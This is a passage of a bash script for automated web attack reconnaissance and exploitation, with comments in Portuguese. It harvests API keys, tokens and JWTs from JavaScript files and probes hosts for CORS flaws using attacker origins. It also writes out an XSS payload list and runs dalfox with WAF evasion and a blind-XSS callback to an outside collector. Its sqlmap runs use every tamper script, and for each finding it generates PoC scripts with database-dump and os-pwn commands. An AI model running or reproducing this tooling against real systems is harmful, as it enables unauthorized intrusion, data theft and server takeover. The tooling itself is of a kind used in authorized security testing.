      grep -oP '(?<=["\x27])(\/api\/[a-zA-Z0-9\/_-]+)(?=["\x27])' "$jsfile" 2>/dev/null || true
      grep -oP '(?<=["\x27])(\/v[0-9]+\/[a-zA-Z0-9\/_-]+)(?=["\x27])' "$jsfile" 2>/dev/null || true
      grep -oP '(?<=["\x27])(\/graphql[a-zA-Z0-9\/_-]*)(?=["\x27])' "$jsfile" 2>/dev/null || true
      
      # Internal endpoints
      grep -oP '(?<=["\x27])(\/_next\/[a-zA-Z0-9\/_-]+)(?=["\x27])' "$jsfile" 2>/dev/null || true
      grep -oP '(?<=["\x27])(\/admin\/[a-zA-Z0-9\/_-]+)(?=["\x27])' "$jsfile" 2>/dev/null || true
      grep -oP '(?<=["\x27])(\/internal\/[a-zA-Z0-9\/_-]+)(?=["\x27])' "$jsfile" 2>/dev/null || true
    done | sort -u > apis/endpoints_from_js.txt
  fi
  
  # 5. Consolidar todos os parâmetros
  cat params/*.txt 2>/dev/null | grep -v "^$" | sort -u > params/all_discovered_params.txt
  local param_count=$(wc -l < params/all_discovered_params.txt 2>/dev/null || echo 0)
  local api_count=$(wc -l < apis/endpoints_from_js.txt 2>/dev/null || echo 0)
  
  log_success "✅ Parameters: $param_count | API Endpoints: $api_count"
}

# ============= GRAPHQL INTROSPECTION & TESTING =============
test_graphql_endpoints() {
  log_info "========== GRAPHQL INTROSPECTION =========="
  
  mkdir -p apis/graphql
  
  # Encontrar possíveis endpoints GraphQL
  log_info "🔮 Identificando endpoints GraphQL..."
  {
    grep -iE "graphql" urls/all_urls.txt 2>/dev/null || true
    grep -iE "graphql" apis/endpoints_from_js.txt 2>/dev/null || true
    cat alive/hosts.txt 2>/dev/null | sed 's/$/\/graphql/' || true
    cat alive/hosts.txt 2>/dev/null | sed 's/$/\/api\/graphql/' || true
  } | sort -u > apis/graphql/potential_endpoints.txt
  
  log_info "🔍 Testando introspection em $(wc -l < apis/graphql/potential_endpoints.txt) endpoints..."
  
  head -n 20 apis/graphql/potential_endpoints.txt | while IFS= read -r url || [[ -n "$url" ]]; do
    safe=$(echo "$url" | md5sum | cut -d' ' -f1)
    
    # Introspection query
    timeout 30 curl -sk "$url" \
      -H "Content-Type: application/json" \
      -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
      -H "Accept: application/json" \
      -d '{"query": "{__schema{types{name,fields{name,type{name,kind}}}}}"}' \
      -o "apis/graphql/introspection_$safe.json" 2>/dev/null || true
    
    # Se retornou schema, é vulnerável
    if grep -q "__schema" "apis/graphql/introspection_$safe.json" 2>/dev/null; then
      echo "$url - INTROSPECTION ENABLED" >> apis/graphql/vulnerable.txt
      log_success "🎯 GraphQL Introspection habilitada: $url"
    fi
    
    sleep 1
  done
  
  local graphql_count=$(wc -l < apis/graphql/vulnerable.txt 2>/dev/null || echo 0)
  log_success "✅ GraphQL endpoints com introspection: $graphql_count"
}

# ============= JWT & TOKEN ANALYSIS (PENTESTER DEEP) =============
analyze_tokens_advanced() {
  log_info "========== JWT & TOKEN DEEP ANALYSIS =========="
  
  mkdir -p secrets/tokens secrets/tokens/analysis
  
  # 1. Extrair JWTs de JS files
  log_info "🔐 Extracting JWT tokens..."
  if [[ -d js/downloads ]]; then
    find js/downloads -type f -name "*.js" | while read -r jsfile; do
      # JWT pattern (eyJ...)
      grep -oP 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' "$jsfile" 2>/dev/null || true
    done | sort -u > secrets/tokens/jwt_found.txt
  fi
  
  # 2. Extrair API Keys e tokens
  log_info "🔑 Extracting API keys and tokens..."
  if [[ -d js/downloads ]]; then
    # Tokens específicos de plataformas
    grep -rhoP 'sk_live_[a-zA-Z0-9]{24,}' js/downloads 2>/dev/null | sort -u > secrets/tokens/stripe_keys.txt || true
    grep -rhoP 'AIza[a-zA-Z0-9_-]{35}' js/downloads 2>/dev/null | sort -u > secrets/tokens/google_api_keys.txt || true
    grep -rhoP 'AKIA[A-Z0-9]{16}' js/downloads 2>/dev/null | sort -u > secrets/tokens/aws_keys.txt || true
    grep -rhoP 'ghp_[a-zA-Z0-9]{36}' js/downloads 2>/dev/null | sort -u > secrets/tokens/github_tokens.txt || true
  fi
  
  # 3. Analisar JWTs encontrados
  log_info "🔬 Analyzing JWT tokens for vulnerabilities..."
  if [[ -s secrets/tokens/jwt_found.txt ]]; then
    head -n 20 secrets/tokens/jwt_found.txt | while read -r token; do
      # Decode JWT (base64)
      echo "=== TOKEN: $token ===" >> secrets/tokens/analysis/jwt_decoded.txt
      echo "$token" | cut -d. -f2 | base64 -d 2>/dev/null | jq '.' 2>/dev/null >> secrets/tokens/analysis/jwt_decoded.txt || true
      echo "" >> secrets/tokens/analysis/jwt_decoded.txt
    done
    
    # Procurar por JWTs sem assinatura (alg: none)
    grep -i '"alg":\s*"none"' secrets/tokens/analysis/jwt_decoded.txt > secrets/tokens/analysis/CRITICAL_no_signature.txt 2>/dev/null || true
  fi
  
  local jwt_count=$(wc -l < secrets/tokens/jwt_found.txt 2>/dev/null || echo 0)
  local stripe=$(wc -l < secrets/tokens/stripe_keys.txt 2>/dev/null || echo 0)
  local aws=$(wc -l < secrets/tokens/aws_keys.txt 2>/dev/null || echo 0)
  
  log_success "✅ JWTs: $jwt_count | Stripe: $stripe | AWS: $aws"
  
  if [[ $stripe -gt 0 ]] || [[ $aws -gt 0 ]]; then
    log_warn "🚨 CRITICAL: Platform-specific keys found! Review secrets/tokens/ directory"
  fi
}

# ============= SUBDOMAIN TAKEOVER DETECTION =============
check_subdomain_takeover() {
  log_info "========== SUBDOMAIN TAKEOVER DETECTION =========="
  
  if [[ ! -s subs/all_subs.txt ]]; then
    log_warn "Sem subdomínios. Pulando takeover check."
    return
  fi
  
  mkdir -p reports/takeover
  
  log_info "🎯 Checking subdomain takeover vulnerabilities..."
  
  # 1. SubOver/Subjack
  if command -v subjack &>/dev/null; then
    timeout 600 subjack -w subs/all_subs.txt \
      -t 20 \
      -timeout 30 \
      -o reports/takeover/subjack_findings.txt \
      -ssl \
      -v 2>/dev/null || true
  fi
  
  # 2. Nuclei takeover templates (usando tags - sintaxe moderna)
  if command -v nuclei &>/dev/null; then
    timeout 600 nuclei -l subs/all_subs.txt \
      -tags takeover \
      -c $(($CONCURRENCY / 2)) \
      -rl $(($RATE_LIMIT / 2)) \
      -o reports/takeover/nuclei_takeover.txt \
      -silent 2>/dev/null || true
  fi
  
  local takeover_count=$(cat reports/takeover/*.txt 2>/dev/null | grep -i "vulnerable\|takeover" | wc -l || echo 0)
  log_success "✅ Potential takeover findings: $takeover_count"
  
  if [[ $takeover_count -gt 0 ]]; then
    log_warn "🚨 SUBDOMAIN TAKEOVER OPPORTUNITIES FOUND! Review reports/takeover/ directory"
  fi
}

# ============= CORS MISCONFIGURATION TESTING =============
test_cors_advanced() {
  log_info "========== ADVANCED CORS MISCONFIGURATION TESTING =========="
  
  if [[ ! -s alive/hosts.txt ]]; then
    log_warn "Sem hosts. Pulando CORS tests."
    return
  fi
  
  mkdir -p reports/cors
  
  log_info "🌐 Testing CORS with multiple attack origins..."
  
  # Origins para testar
  local attack_origins=(
    "https://evil.com"
    "null"
    "http://localhost"
    "https://localhost"
    "http://127.0.0.1"
    "https://attacker.com"
  )
  
  head -n 50 alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
    safe=$(echo "$url" | md5sum | cut -d' ' -f1)
    
    for origin in "${attack_origins[@]}"; do
      response=$(timeout 10 curl -sk "$url" \
        -H "Origin: $origin" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -i 2>/dev/null || true)
      
      # Verificar ACAO header
      acao=$(echo "$response" | grep -i "Access-Control-Allow-Origin:" | head -n1)
      acac=$(echo "$response" | grep -i "Access-Control-Allow-Credentials:" | head -n1)
      
      if echo "$acao" | grep -qi "$origin\|*"; then
        echo "[CORS] $url" >> "reports/cors/findings_$safe.txt"
        echo "  Origin: $origin" >> "reports/cors/findings_$safe.txt"
        echo "  $acao" >> "reports/cors/findings_$safe.txt"
        echo "  $acac" >> "reports/cors/findings_$safe.txt"
        echo "" >> "reports/cors/findings_$safe.txt"
        
        # CRITICAL: ACAO reflect + credentials
        if echo "$acao" | grep -q "$origin" && echo "$acac" | grep -qi "true"; then
          echo "🚨 CRITICAL: $url reflects origin '$origin' with credentials=true" >> reports/cors/CRITICAL_findings.txt
        fi
      fi
    done
    
    sleep 0.5
  done
  
  # Consolidar findings
  cat reports/cors/findings_*.txt 2>/dev/null | sort -u > reports/cors/all_cors_issues.txt
  
  local cors_count=$(grep -c "^\[CORS\]" reports/cors/all_cors_issues.txt 2>/dev/null || echo 0)
  local critical=$(wc -l < reports/cors/CRITICAL_findings.txt 2>/dev/null || echo 0)
  
  log_success "✅ CORS issues: $cors_count | Critical: $critical"
  
  if [[ $critical -gt 0 ]]; then
    log_warn "🚨 CRITICAL CORS MISCONFIGURATIONS FOUND!"
  fi
}

# ============= ADVANCED SSRF PATTERNS =============
test_ssrf_advanced() {
  log_info "========== ADVANCED SSRF DETECTION =========="
  
  mkdir -p reports/ssrf
  
  if [[ ! -s urls/with_params.txt ]]; then
    log_warn "Sem URLs com parâmetros. Pulando SSRF."
    return
  fi
  
  log_info "📡 Testing SSRF with advanced patterns..."
  
  # Nuclei SSRF templates (usando tags - sintaxe moderna)
  if command -v nuclei &>/dev/null; then
    head -n 100 urls/with_params.txt | timeout 600 nuclei \
      -tags ssrf \
      -c $(($CONCURRENCY / 2)) \
      -rl $(($RATE_LIMIT / 2)) \
      -o reports/ssrf/nuclei_ssrf.txt \
      -silent 2>/dev/null || true
  fi
  
  # Identificar parâmetros suspeitos para SSRF
  log_info "🔍 Identifying SSRF-prone parameters..."
  grep -iE "(url|uri|path|dest|redirect|next|target|rurl|link|domain|host|proxy|api|callback|return|goto|jump|view|data|load|src)" \
    urls/with_params.txt 2>/dev/null > reports/ssrf/ssrf_candidates.txt || true
  
  local ssrf_findings=$(wc -l < reports/ssrf/nuclei_ssrf.txt 2>/dev/null || echo 0)
  local candidates=$(wc -l < reports/ssrf/ssrf_candidates.txt 2>/dev/null || echo 0)
  
  log_success "✅ SSRF findings: $ssrf_findings | Candidates: $candidates"
}

# ============= RUN ADVANCED PENTESTER FUNCTIONS =============
if [[ "$DRY_RUN" = "false" ]]; then
    log_info "🎯 Executando funções avançadas de pentesting..."
    advanced_parameter_discovery
    test_graphql_endpoints
    analyze_tokens_advanced
    check_subdomain_takeover
    test_cors_advanced
    test_ssrf_advanced
else
    log_info "DRY-RUN: Pulando funções avançadas de pentesting"
fi

echo "========== FASE 5: VULNERABILITY SCANNING =========="
send_notification "🎯 *NUCLEI VULNERABILITY SCAN*  
Iniciando varredura de vulnerabilidades..."

# Função nuclei_scanning com flags otimizadas
#!/bin/bash

# ----------------------------------------------------
TEMPLATE_TIMEOUT=45
nuclei_scanning() {
    if ! command -v nuclei >/dev/null 2>&1; then
        log_info "nuclei não encontrado — pulando etapa de varredura"
        return
    fi

    # Atualizar templates do nuclei primeiro
    log_info "📦 Atualizando templates do Nuclei..."
    nuclei -ut -silent >/dev/null 2>&1 || true
    
    # Argumentos base que podem ser usados em todas as etapas
    build_nuclei_args NUCLEI_ARGS
    
    # --- ETAPA 1: FAST MODE TURBINADO BRUTAL ---
    log_info "🔥 Executando nuclei FAST mode BRUTAL (todas vulnerabilidades críticas)..."
    if [[ -s alive/hosts.txt ]]; then
        log_info "📊 Alvos encontrados: $(wc -l < alive/hosts.txt)"
        timeout 3h nuclei -l alive/hosts.txt \
            -tags cve,exposure,token,takeover,default-login,sqli,xss,rce,lfi,ssrf,xxe,idor,ssti \
            -severity critical,high,medium \
            -headless \
            -stats \
            -rl "$RATE_LIMIT" -c "$CONCURRENCY" -timeout "$TEMPLATE_TIMEOUT" \
            -etags dos,fuzz,intrusive \
            -o nuclei/nuclei_hosts_fast.txt 2>&1 | tee logs/nuclei_fast_errors.log || true
    else
        log_info "⚠️  Arquivo alive/hosts.txt vazio ou não encontrado"
    fi
    if [[ -s urls/all_urls_raw.txt ]]; then
        log_info "📊 URLs encontradas: $(wc -l < urls/all_urls_raw.txt)"
        timeout 3h nuclei -l urls/all_urls_raw.txt \
            -tags cve,exposure,token,takeover,default-login,sqli,xss,rce,lfi,ssrf,xxe,idor,ssti \
            -severity critical,high,medium \
            -headless \
            -stats \
            -rl "$RATE_LIMIT" -c "$CONCURRENCY" -timeout "$TEMPLATE_TIMEOUT" \
            -etags dos,fuzz,intrusive \
            -o nuclei/nuclei_urls_fast.txt 2>&1 | tee logs/nuclei_fast_urls_errors.log || true
    else
        log_info "⚠️  Arquivo urls/all_urls_raw.txt vazio ou não encontrado"
    fi

    # --- ETAPA 2: EXTENDED MODE COMPLETO E BRUTAL ---
    log_info "🔥 Executando nuclei EXTENDED mode BRUTAL (cobertura total)..."
    if [[ -s alive/hosts.txt ]]; then
        timeout 6h nuclei -l alive/hosts.txt \
            -tags misconfig,panel,default-login,exposure,tech,iot,network,disclosure,token \
            -severity critical,high,medium,low \
            -headless \
            -stats \
            -rl "$RATE_LIMIT" -c "$CONCURRENCY" -timeout "$TEMPLATE_TIMEOUT" \
            -etags dos,fuzz,intrusive \
            -o nuclei/nuclei_hosts_ext.txt 2>&1 | tee logs/nuclei_ext_errors.log || true
    else
        log_info "⚠️  Arquivo alive/hosts.txt vazio ou não encontrado"
    fi

    # --- ETAPA 3: MODO FUZZING & WORKFLOWS TOTAL BRUTAL ---
    log_info "🔥 Executando Nuclei - MODO FUZZING & WORKFLOWS BRUTAL..."
    if [[ -s alive/hosts.txt ]]; then
        timeout 12h nuclei -l alive/hosts.txt \
            -dast \
            -tags fuzz,fuzzing,workflows \
            -severity critical,high,medium,low,info \
            -headless \
            -stats \
            -rl "$RATE_LIMIT" -c "$CONCURRENCY" -timeout "$TEMPLATE_TIMEOUT" \
            -etags dos,intrusive \
            -o nuclei/nuclei_fuzzing_workflows.txt 2>&1 | tee logs/nuclei_fuzz_errors.log || true
    else
        log_info "⚠️  Arquivo alive/hosts.txt vazio ou não encontrado"
    fi
    
    # --- ETAPA 4: SCAN AVANÇADO DE JAVASCRIPT/DOM BRUTAL ---
    log_info "🔥 Executando nuclei DOM/JavaScript focused scan BRUTAL..."
    if [[ -s alive/hosts.txt ]]; then
        timeout 4h nuclei -l alive/hosts.txt \
            -tags javascript,dom,xss,prototype-pollution \
            -severity critical,high,medium,low \
            -headless \
            -stats \
            -rl "$RATE_LIMIT" -c "$CONCURRENCY" -timeout "$TEMPLATE_TIMEOUT" \
            -etags dos \
            -o nuclei/nuclei_dom_js.txt 2>&1 | tee logs/nuclei_js_errors.log || true
    else
        log_info "⚠️  Arquivo alive/hosts.txt vazio ou não encontrado"
    fi
    log_info "✅ Análise BRUTAL completa do Nuclei finalizada."
}

# Função xss_testing com dalfox BRUTAL + payloads customizados
#!/bin/bash

# --- CONFIGURAÇÕES BRUTAIS PARA O DALFOX ---
BLIND_XSS_URL="${BLIND_XSS_URL:-http://requestrepo.com/r/5rna3gam/}"
CUSTOM_PAYLOADS_FILE="${CUSTOM_PAYLOADS_FILE:-}"

# Criar arquivo de payloads customizados se não existir
if [[ -z "$CUSTOM_PAYLOADS_FILE" ]]; then
    CUSTOM_PAYLOADS_FILE="nuclei/xss_testing/custom_xss_payloads.txt"
    mkdir -p nuclei/xss_testing
    cat > "$CUSTOM_PAYLOADS_FILE" <<'XSSPAYLOADS'
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<iframe src="javascript:alert(document.domain)">
<body onload=alert(document.domain)>
<input onfocus=alert(document.domain) autofocus>
<select onfocus=alert(document.domain) autofocus>
<textarea onfocus=alert(document.domain) autofocus>
<keygen onfocus=alert(document.domain) autofocus>
<video><source onerror="alert(document.domain)">
<audio src=x onerror=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<marquee onstart=alert(document.domain)>
'><script>alert(document.domain)</script>
"><script>alert(document.domain)</script>
</script><script>alert(document.domain)</script>
;alert(document.domain)//
'-alert(document.domain)-'
"-alert(document.domain)-"
javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>
XSSPAYLOADS
fi
# ---------------------------------------------------

xss_testing() {
    if command -v dalfox >/dev/null 2>&1 && [[ -s urls/with_params.txt ]]; then
        log_info "Executando dalfox XSS testing BRUTAL com payloads customizados..."
        
        mkdir -p nuclei/xss_testing logs/xss
        
        # --- ETAPA 1: Teste BRUTAL em URLs com Parâmetros ---
        log_info "[BRUTAL] Etapa 1: Testando TODOS os parâmetros com payloads customizados..."
        timeout 90m cat urls/with_params.txt | dalfox pipe \
            -w "$CONCURRENCY" \
            --timeout 15 \
            --mining-dom \
            --mining-dict \
            --deep-domxss \
            --follow-redirects \
            --method GET,POST \
            --waf-evasion \
            --custom-payload "$CUSTOM_PAYLOADS_FILE" \
            -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 dalfox-scan" \
            -H "X-Forwarded-For: 127.0.0.1" \
            -H "X-Originating-IP: 127.0.0.1" \
            -H "Accept: */*" \
            --only-poc \
            --format json \
            -o nuclei/dalfox_json.txt 2>logs/xss/dalfox_pipe_errors.log || true
            
        # Extrair POCs em formato legível
        if [[ -s nuclei/dalfox_json.txt ]]; then
            cat nuclei/dalfox_json.txt | jq -r '.poc' 2>/dev/null > nuclei/dalfox_pocs.txt || true
        fi
        
        # --- ETAPA 2: Teste BRUTAL com Blind XSS e DOM ---
        log_info "[BRUTAL] Etapa 2: Teste profundo Blind e DOM XSS..."
        if [[ -s urls/gf_xss.txt ]]; then
            timeout 60m cat urls/gf_xss.txt | dalfox pipe \
                -w "$CONCURRENCY" \
                --blind "$BLIND_XSS_URL" \
                --deep-domxss \
                --mining-dict \
                --mining-dom \
                --skip-bav \
                --multicast \
                --custom-payload "$CUSTOM_PAYLOADS_FILE" \
                --waf-evasion \
                --follow-redirects \
                -o nuclei/dalfox_results.txt 2>logs/xss/dalfox_file_errors.log || true
        fi
        
        # --- ETAPA 3: Modo URL único BRUTAL ---
        log_info "[BRUTAL] Etapa 3: Teste individual de URLs críticas..."
        if [[ -s urls/with_params.txt ]]; then
            head -10 urls/with_params.txt | while IFS= read -r url || [[ -n "$url" ]]; do
                safe=$(echo "$url" | md5sum | cut -c1-8)
                timeout 180s dalfox url "$url" \
                    -b "$BLIND_XSS_URL" \
                    --custom-payload "$CUSTOM_PAYLOADS_FILE" \
                    --waf-evasion \
                    --mining-dom \
                    --mining-dict \
                    --deep-domxss \
                    --follow-redirects \
                    -w 100 \
                    -o nuclei/xss_testing/dalfox_${safe}.txt 2>/dev/null || true
            done
        fi
        
        log_info "✅ Dalfox XSS BRUTAL testing completo"
    fi

    # Burp Suite Pro Scanner Integration (se disponível)
    run_burp_scanner
}

# ============= BURP SUITE PRO - PROXY INTEGRATION (NÃO CLI) =============
run_burp_scanner() {
    # Verificar se existe uma instância do Burp Suite rodando com proxy
    BURP_PROXY_HOST="${BURP_PROXY_HOST:-127.0.0.1}"
    BURP_PROXY_PORT="${BURP_PROXY_PORT:-8080}"
    
    # Testar conexão com proxy do Burp
    if ! timeout 3 bash -c "echo > /dev/tcp/$BURP_PROXY_HOST/$BURP_PROXY_PORT" 2>/dev/null; then
        log_info "⚠️  Burp Suite Proxy não detectado em $BURP_PROXY_HOST:$BURP_PROXY_PORT"
        log_info "💡 DICA: Inicie o Burp Suite Pro e ative o Proxy listener"
        log_info "💡 Configure: Proxy > Options > Proxy Listeners > 127.0.0.1:8080"
        log_info "💡 Ative: Scanner > Live scanning > Live active scanning"
        return 0
    fi
    
    if [[ ! -s urls/with_params.txt ]]; then
        log_info "⚠️  Nenhuma URL parametrizada para Burp Scanner"
        return 0
    fi
    
    log_info "🔥 Burp Suite Proxy detectado! Enviando tráfego via proxy para scanning automático..."
    log_info "🎯 Certifique-se que 'Live Active Scanning' está ATIVO no Burp Suite Pro"
    mkdir -p nuclei/burp_scan logs/burp
    
    # Criar script Python para enviar requests via Burp Proxy
    cat > nuclei/burp_scan/burp_proxy_sender.py <<BURPPYTHON
#!/usr/bin/env python3
import sys
import requests
from urllib.parse import urlparse, parse_qs
import time

# Desabilitar warnings de SSL
requests.packages.urllib3.disable_warnings()

# Configurar proxy do Burp
proxies = {
    'http': 'http://${BURP_PROXY_HOST}:${BURP_PROXY_PORT}',
    'https': 'http://${BURP_PROXY_HOST}:${BURP_PROXY_PORT}'
}

# Headers realistas
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'DNT': '1',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

def send_to_burp(url):
    """Envia requisição através do proxy do Burp para scanning"""
    try:
        # GET request
        r = requests.get(url, headers=headers, proxies=proxies, verify=False, timeout=30, allow_redirects=True)
        print(f"[+] GET {url} - Status: {r.status_code}")
        
        # Se tiver parâmetros, também testar POST
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            # Converter para dict simples
            post_data = {k: v[0] for k, v in params.items()}
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            r_post = requests.post(base_url, data=post_data, headers=headers, proxies=proxies, verify=False, timeout=30)
            print(f"[+] POST {base_url} - Status: {r_post.status_code}")
        
        time.sleep(0.5)  # Rate limiting suave
        return True
        
    except requests.exceptions.ProxyError:
        print(f"[!] Erro de proxy - Burp Suite está rodando em 127.0.0.1:8080?", file=sys.stderr)
        return False
    except Exception as e:
        print(f"[-] Erro ao processar {url}: {e}", file=sys.stderr)
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: burp_proxy_sender.py <url>")
        sys.exit(1)
    
    url = sys.argv[1]
    send_to_burp(url)
BURPPYTHON
    
    chmod +x nuclei/burp_scan/burp_proxy_sender.py
    
    # Enviar URLs através do proxy do Burp
    local max_urls=50
    [[ "$PROFILE" = "light" ]] && max_urls=20
    [[ "$PROFILE" = "aggressive" ]] && max_urls=100
    
    log_info "📡 Enviando $max_urls URLs para Burp Suite via proxy..."
    log_info "⏰ Isso pode demorar - o Burp está fazendo scan ativo em background!"
    
    local count=0
    head -n "$max_urls" urls/with_params.txt | while IFS= read -r url || [[ -n "$url" ]]; do
        count=$((count + 1))
        echo "[Burp $count/$max_urls] $url"
        
        # Enviar via proxy usando Python
        timeout 45s python3 nuclei/burp_scan/burp_proxy_sender.py "$url" 2>>logs/burp/proxy_errors.log || true
        
        # Também enviar com curl como fallback
        timeout 20s curl -x "http://$BURP_PROXY_HOST:$BURP_PROXY_PORT" \
            -k -s -L \
            -A "Mozilla/5.0 BurpScanner" \
            "$url" >/dev/null 2>&1 || true
    done
    
    log_info "✅ Tráfego enviado para Burp Suite Proxy"
    log_info "📊 Verifique os resultados no Burp Suite:"
    log_info "   • Target > Site map - para ver todas as requests"
    log_info "   • Scanner > Issue activity - para ver vulnerabilidades encontradas"
    log_info "   • Scanner > Scan queue - para ver progresso do scan"
    log_info ""
    log_info "💡 DICA: Deixe o Burp Suite rodando para completar os scans ativos"
    log_info "💡 Use: Scanner > Export issues para exportar resultados"
}

# Função sqlmap_testing
sqlmap_testing() {
    if command -v sqlmap >/dev/null 2>&1 && [[ -s urls/with_params.txt ]]; then
        log_info "Iniciando SQLMap testing BRUTAL com payloads customizados..."
        send_notification "💉 *SQL INJECTION TESTING BRUTAL*
Testando URLs para SQLi com máxima agressividade..."
        
        mkdir -p poc/sqli logs/sqlmap
        
        if command -v gf >/dev/null 2>&1; then
            cat urls/with_params.txt | gf sqli 2>/dev/null > urls/sqli_candidates.txt || true
        else
            grep -Ei "(\?|&)(id|user|search|category|page|item|product)=" urls/with_params.txt > urls/sqli_candidates.txt 2>/dev/null || true
        fi
        
        if [[ ! -s urls/sqli_candidates.txt ]]; then
            head -10 urls/with_params.txt > urls/sqli_candidates.txt
        fi
        
        local candidates=$(safe_count urls/sqli_candidates.txt)
        log_info "Testando $candidates candidatos SQLi com sqlmap BRUTAL..."
        
        local max_urls=10
        [[ "$PROFILE" = "light" ]] && max_urls=5
        [[ "$PROFILE" = "aggressive" ]] && max_urls=20
        [[ "$PROFILE" = "kamikaze" ]] && max_urls=50
        
        local current=0
        > urls/sqli_validated.txt
        
        head -n "$max_urls" urls/sqli_candidates.txt | while read -r url && [[ $current -lt $max_urls ]]; do
            current=$((current + 1))
            log_info "[SQLMap BRUTAL $current/$max_urls] Testando: $url"
            
            local url_hash=$(echo "$url" | md5sum | cut -c1-8)
            local log_file="logs/sqlmap/sqlmap_${url_hash}.txt"
            
            # SQLMap BRUTAL com TODOS os tampers e máxima agressividade
            timeout 600s sqlmap \
                -u "$url" \
                --batch --level="$SQLMAP_LEVEL" --risk="$SQLMAP_RISK" \
                --random-agent --threads=10 \
                --technique=BEUSTQ \
                --suffix="-- -" \
                --prefix="'" \
                --tamper=space2comment,between,charencode,randomcase,apostrophemask,base64encode,charunicodeencode,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcomments,securesphere,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords \
                --dbms=MySQL,PostgreSQL,MSSQL,Oracle,SQLite \
                --no-cast --disable-coloring \
                --answers="follow=N,other=N,crack=N,dict=N,keep=Y" \
                --timeout=120 --retries=5 \
                --smart \
                --crawl=5 \
                --forms \
                --cookie-del \
                --delay=0 \
                --time-sec=10 \
                --union-cols=50 \
                --union-char='NULL' \
                --dns-domain \
                --second-url \
                --auth-type=Basic \
                --flush-session \
                --output-dir="poc/sqli" \
                > "$log_file" 2>&1 || {
                    echo "[TIMEOUT/ERROR] $url" >> logs/sqlmap/errors.log
                    continue
                }

            if grep -qi "parameter.*is vulnerable\|sqlmap identified the following injection point\|payload.*worked" "$log_file"; then
                echo "$url" >> urls/sqli_validated.txt
                log_info "⚠️  VULNERABILIDADE SQLi ENCONTRADA: $url"
                
                # Enviar notificação de SQLi encontrada
                send_notification "🚨 *SQL INJECTION FOUND!*
💉 URL: \`$url\`
🔍 Verificar: poc/sqli/ e logs/sqlmap/" "true"
                
                cat > "poc/sqli/exploit_${url_hash}.sh" <<'SQLPOC'
#!/bin/bash
# SQLi exploit para: $url
# Encontrada em: $(date)

echo "=== SQLi Exploitation PoC ==="
echo "Target: $url"
echo ""

echo "1. Listando databases:"
sqlmap -u "$url" --batch --dbs --threads=2

echo ""
echo "2. Para dump de tabelas específicas:"
echo "sqlmap -u '$url' --batch -D DATABASE_NAME --tables"

echo ""
echo "3. CUIDADO: Dump completo (apenas com autorização):"
echo "sqlmap -u '$url' --batch --dump --threads=2"

echo ""
echo "4. OS Pwn (máxima brutalidade - requer autorização):"
echo "sqlmap -u '$url' --batch --os-pwn --priv-esc"
SQLPOC
                chmod +x "poc/sqli/exploit_${url_hash}.sh"
            fi
        done
        
        local sqli_found=$(safe_count urls/sqli_validated.txt)
        log_info "SQLMap BRUTAL testing completo. Vulnerabilidades encontradas: $sqli_found"
        
        if [[ "$sqli_found" -gt 0 ]]; then
            send_notification "🚨 *SQLi VULNERABILITIES CONFIRMED*
💥 $sqli_found SQL injections encontradas!
📁 PoCs gerados em poc/sqli/
⚠️ REVISÃO MANUAL URGENTE!" true
        else
            send_notification "✅ *SQLi TESTING COMPLETE*
🛡️ Nenhuma vulnerabilidade SQLi confirmada nos candidatos testados"
        fi
    else
        log_info "SQLMap não disponível ou nenhuma URL com parâmetros encontrada"
        touch urls/sqli_candidates.txt urls/sqli_validated.txt
    fi
}

# ============= FASE 5: VULNERABILITY SCANNING =============
echo ""
echo "========== FASE 5: VULNERABILITY SCANNING =========="
send_notification "🎯 *NUCLEI VULNERABILITY SCAN*  
Iniciando varredura de vulnerabilidades..."

if [ "${DRY_RUN:-false}" != "true" ]; then
    nuclei_scanning
    xss_testing
    sqlmap_testing
else
    log_info "DRY-RUN: Pulando vulnerability scanning"
    mkdir -p nuclei
    : > nuclei/nuclei_hosts_fast.txt
    : > nuclei/nuclei_urls_fast.txt
    : > nuclei/nuclei_hosts_ext.txt
    : > nuclei/dalfox_results.txt
fi

# ============= SECRETS HUNTING APRIMORADO =============
echo ""
echo "========== SECRETS HUNTING =========="
send_notification "🔑 *SECRETS HUNTING*
Analisando arquivos JS para secrets..."

secrets_hunting() {
    mkdir -p secrets
    
    if [[ -d js/downloads ]] && [[ "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "Escaneando arquivos JavaScript para secrets..."
        
        grep -IrohE "AKIA[0-9A-Z]{16}" js/downloads/* 2>/dev/null | sort -u > secrets/aws_keys.txt || true
        grep -IrohE "AIza[0-9A-Za-z\\-_]{35}" js/downloads/* 2>/dev/null | sort -u > secrets/google_api_keys.txt || true
        grep -IrohE "firebase[_-]?api[_-]?key[\"']?\s*[:=]\s*[\"'][A-Za-z0-9\-_.]{20,}[\"']" js/downloads/* 2>/dev/null | sort -u > secrets/firebase_keys.txt || true
        grep -IrohE "eyJ[0-9A-Za-z\-_]{30,}\.[0-9A-Za-z\-_]{30,}\.[0-9A-Za-z\-_]{20,}" js/downloads/* 2>/dev/null | sort -u > secrets/jwt_tokens.txt || true
